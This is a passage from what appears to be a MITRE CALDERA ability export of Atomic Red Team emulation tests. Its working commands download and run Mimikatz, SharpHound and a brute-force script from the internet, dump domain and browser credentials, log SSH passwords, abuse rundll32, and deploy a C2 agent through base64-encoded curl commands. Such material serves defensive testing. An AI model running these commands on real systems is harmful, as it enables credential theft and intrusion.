Execution of SharpHound.ps1 from PathToAtomicsFolder\\T1059.001\\src\" -ForegroundColor Cyan; import-module PathToAtomicsFolder\\T1059.001\\src\\SharpHound.ps1; Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "301c5fa0f27e0c63c2a3a0d14e043b83", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Run BloodHound from local disk", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:Temp\\*BloodHound.zip -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan; IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "0ecc3d4729cf37c719528291d63f9f99", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Run Bloodhound from Memory using Download Cradle", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of $env:TEMP\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\Sysinternals -Force -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-Location -path \"$env:TEMP\\Sysinternals\"; ./accesschk.exe -accepteula .;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "24b8cc6c8e6c224a4f698ac3983d524d", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "Run Chrome-password Collector", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ADReplAccount -All -Server", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: DCSync", "ability_id": "ccf2af19610078752b4982a33b269f6f", "technique_id": "T1003.006", "tactic": "credential-access", "requirements": [], "name": "Run DSInternals Get-ADReplAccount", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.katz", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_password", "target": "domain.user.password", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Run PowerKatz", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module executes notepad.exe from within the WINWORD.EXE process\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Injection: Process Hollowing", "ability_id": "557321faaf98c77b2b452cecd7b1de37", "technique_id": "T1055.012", "tactic": "multiple", "requirements": [], "name": "RunPE via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["80d0e0_T1218.011.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe advpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "bc4acf1b832d3e26002c7155453a4b4d", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 advpack.dll Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["taskkill /IM notepad.exe /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "d68bca253560877e22685a3dd3ff4dd4", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 execute JavaScript Remote Payload With GetObject", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "bc90f2994ce850e89f5ffc6101369329", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 execute VBscript command", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "eca315e7b5064744f5bf5ffa39a7560c", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 execute VBscript command using Ordinal number", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["80d0e0_T1218.011.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe ieadvpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "0556cba95bf8acdff3c9c7b5e13443ce", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 ieadvpack.dll Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["4c870d_T1218.011_DefaultInstall.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 4c870d_T1218.011_DefaultInstall.inf", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "ae21aefd2d9933df45a4e55485fbc333", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 setupapi.dll Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["4c870d_T1218.011_DefaultInstall.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 4c870d_T1218.011_DefaultInstall.inf", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "fe467fe47ac8270191a18d9811f734ce", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 syssetup.dll Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["6349c0_calc.dll"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe shell32.dll,Control_RunDLL 6349c0_calc.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "12c0f2fbbae732e1deca4f23c8823a7a", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 with Control_RunDLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["be0315_AllTheThingsx64.dll"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe be0315_AllTheThingsx64.dll,#2", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "5ecf2385ad32719a3cc72bed33c60b57", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 with Ordinal Value", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del not_an_scr.scr"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %windir%\\System32\\calc.exe not_an_scr.scr && rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "2030ccf9f80ce3020e4ee510fadeb0be", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Rundll32 with desk.cpl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {; Remove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name \"chrome\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "External Remote Services", "ability_id": "03c06bf996733700b9bc025c7f5bc887", "technique_id": "T1133", "tactic": "multiple", "requirements": [], "name": "Running Chrome VPN Extensions via the Registry 2 vpn extension", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using username,password combination from a password dump to login over SSH.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["181475_credstuffuserpass.txt"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp 181475_credstuffuserpass.txt /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Credential Stuffing", "ability_id": "a3fb0059bd5dea11d715cba0e09631d5", "technique_id": "T1110.004", "tactic": "credential-access", "requirements": [], "name": "SSH Credential Stuffing From Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using username,password combination from a password dump to login over SSH.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["181475_credstuffuserpass.txt"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp 181475_credstuffuserpass.txt /tmp/; for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@localhost;done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Credential Stuffing", "ability_id": "755379ed9f057c8b0f95d98bfbf3880d", "technique_id": "T1110.004", "tactic": "credential-access", "requirements": [], "name": "SSH Credential Stuffing From MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["cp -fv /tmp/sshd /etc/pam.d/"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp -v /etc/pam.d/sshd /tmp/; echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd; systemctl restart sshd; systemctl restart auditd; ssh ubuntu@localhost ; whoami; sudo su; whoami; exit; exit", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "b52cfdbe25a4907867c8a7a4d639e471", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "SSHD PAM keylogger", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -fr art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "740d52a409b9ec10c0eedc2cbe90614e", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "SUDO Brute Force - Debian", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel -fr art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "26c5328910ea05ace22e9795a45ca8b6", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "SUDO Brute Force - Redhat", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v", "language": null, "name": "sh", "variations": [{"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUgJg==", "description": "Deploy as a blue-team agent instead of red"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgJg==", "description": "Download with a random name and start as a background process"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6I3thZ2VudC5leHRlbnNpb25zfSIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLXY=", "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang)."}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6Z2lzdCIgLUggImMyOmdpc3QiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLWMyIEdJU1QgLXY=", "description": "Download with GIST C2"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6cHJveHlfaHR0cCIgLUggImluY2x1ZGVQcm94eVBlZXJzOkhUVFAiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLXNlcnZlciAkc2VydmVyIC1saXN0ZW5QMlAgLXY=", "description": "Deploy as a P2P agent with known peers included in compiled agent"}], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -group red -v", "language": null, "name": "sh", "variations": [{"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgYmx1ZSAm", "description": "Deploy as a blue-team agent instead of red"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAm", "description": "Download with a random name and start as a background process"}, {"command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczoje2FnZW50LmV4dGVuc2lvbnN9IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgPiAje2FnZW50cy5pbXBsYW50X25hbWV9O2NobW9kICt4ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Li8je2FnZW50cy5pbXBsYW50X25hbWV9IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIC12", "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang)."}, {"command": 